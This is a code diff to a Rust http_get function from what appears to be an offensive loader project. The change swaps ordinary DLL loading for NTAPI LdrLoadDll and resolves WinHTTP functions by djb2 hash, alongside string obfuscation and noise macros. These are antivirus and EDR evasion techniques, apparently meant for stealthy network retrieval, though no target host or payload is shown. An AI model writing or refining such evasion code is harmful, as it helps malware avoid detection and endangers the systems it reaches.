@@ -1,7 +1,9 @@
 #![allow(non_snake_case, non_camel_case_types)]
 
 pub fn http_get(url: &str) -> crate::utils::error::RslResult<(u16, Vec<u8>)> {
-    use crate::utils::{get_proc_address, load_library};
+    use crate::ntapi::ldr_load_dll;
+    use crate::syscall::common::get_loaded_module_by_hash;
+    use crate::syscall::common::pe::get_export_by_hash;
     use obfstr::{obfbytes, obfstr};
     use rsl_macros::obfuscation_noise_macro;
     use std::ffi::c_void;
@@ -93,48 +95,34 @@ pub fn http_get(url: &str) -> crate::utils::error::RslResult<(u16, Vec<u8>)> {
     let method_w = to_wstring("GET");
 
     unsafe {
-        // Load winhttp.dll
-        let winhttp_dll = load_library(obfbytes!(b"winhttp.dll\0").as_slice())?;
+        // Load winhttp.dll using NTAPI (checks hash first internally)
+        let winhttp_hash = crate::dbj2_hash!(b"winhttp.dll");
+        let winhttp_dll = ldr_load_dll(obfstr!("winhttp.dll"), winhttp_hash)?;
 
-        // Resolve functions
-        let win_http_open: WinHttpOpenFn = std::mem::transmute(get_proc_address(
-            winhttp_dll,
-            obfbytes!(b"WinHttpOpen\0").as_slice(),
-        )?);
-        let win_http_connect: WinHttpConnectFn = std::mem::transmute(get_proc_address(
-            winhttp_dll,
-            obfbytes!(b"WinHttpConnect\0").as_slice(),
-        )?);
-        let win_http_open_request: WinHttpOpenRequestFn = std::mem::transmute(get_proc_address(
-            winhttp_dll,
-            obfbytes!(b"WinHttpOpenRequest\0").as_slice(),
-        )?);
-        let win_http_send_request: WinHttpSendRequestFn = std::mem::transmute(get_proc_address(
-            winhttp_dll,
-            obfbytes!(b"WinHttpSendRequest\0").as_slice(),
-        )?);
+        // Resolve functions using syscall/common/pe
+        let get_fn = |hash: u32| -> crate::utils::error::RslResult<*mut u8> {
+            get_export_by_hash(winhttp_dll as *mut u8, hash)
+                .ok_or(crate::utils::error::RslError::FunctionNotFound(hash))
+        };
+
+        let win_http_open: WinHttpOpenFn =
+            std::mem::transmute(get_fn(crate::dbj2_hash!(b"WinHttpOpen"))?);
+        let win_http_connect: WinHttpConnectFn =
+            std::mem::transmute(get_fn(crate::dbj2_hash!(b"WinHttpConnect"))?);
+        let win_http_open_request: WinHttpOpenRequestFn =
+            std::mem::transmute(get_fn(crate::dbj2_hash!(b"WinHttpOpenRequest"))?);
+        let win_http_send_request: WinHttpSendRequestFn =
+            std::mem::transmute(get_fn(crate::dbj2_hash!(b"WinHttpSendRequest"))?);
         let win_http_receive_response: WinHttpReceiveResponseFn =
-            std::mem::transmute(get_proc_address(
-                winhttp_dll,
-                obfbytes!(b"WinHttpReceiveResponse\0").as_slice(),
-            )?);
-        let win_http_query_headers: WinHttpQueryHeadersFn = std::mem::transmute(get_proc_address(
-            winhttp_dll,
-            obfbytes!(b"WinHttpQueryHeaders\0").as_slice(),
-        )?);
+            std::mem::transmute(get_fn(crate::dbj2_hash!(b"WinHttpReceiveResponse"))?);
+        let win_http_query_headers: WinHttpQueryHeadersFn =
+            std::mem::transmute(get_fn(crate::dbj2_hash!(b"WinHttpQueryHeaders"))?);
         let win_http_query_data_available: WinHttpQueryDataAvailableFn =
-            std::mem::transmute(get_proc_address(
-                winhttp_dll,
-                obfbytes!(b"WinHttpQueryDataAvailable\0").as_slice(),
-            )?);
-        let win_http_read_data: WinHttpReadDataFn = std::mem::transmute(get_proc_address(
-            winhttp_dll,
-            obfbytes!(b"WinHttpReadData\0").as_slice(),
-        )?);
-        let win_http_close_handle: WinHttpCloseHandleFn = std::mem::transmute(get_proc_address(
-            winhttp_dll,
-            obfbytes!(b"WinHttpCloseHandle\0").as_slice(),
-        )?);
+            std::mem::transmute(get_fn(crate::dbj2_hash!(b"WinHttpQueryDataAvailable"))?);
+        let win_http_read_data: WinHttpReadDataFn =
+            std::mem::transmute(get_fn(crate::dbj2_hash!(b"WinHttpReadData"))?);
+        let win_http_close_handle: WinHttpCloseHandleFn =
+            std::mem::transmute(get_fn(crate::dbj2_hash!(b"WinHttpCloseHandle"))?);
 
         let h_session = win_http_open(
             user_agent.as_ptr(),
